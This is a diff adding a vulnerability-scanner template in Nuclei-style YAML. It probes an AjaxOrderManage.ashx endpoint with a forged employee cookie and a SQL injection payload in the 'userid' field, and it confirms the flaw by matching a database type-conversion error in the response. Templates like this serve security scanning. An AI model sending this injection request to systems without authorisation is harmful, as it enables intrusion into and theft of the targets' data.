@@ -1,0 +1,27 @@
+id: ajax-order-manage-vulnerability
+info:
+  name: Ajax Order Manage Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template checks for a potential vulnerability in the AjaxOrderManage.ashx endpoint when processing specific POST requests. The issue is confirmed if the response status code is 200 and it contains the phrase '转换成数据类型'.
+  tags: vulnerability, ajax, order, post
+
+http:
+  - raw:
+      - |
+        POST /m/Dingding/Ajax/AjaxOrderManage.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: UserCookie={"empId":"1"}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=getsalesfunnel&userid='-1/user--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "转换成数据类型"
+        part: body
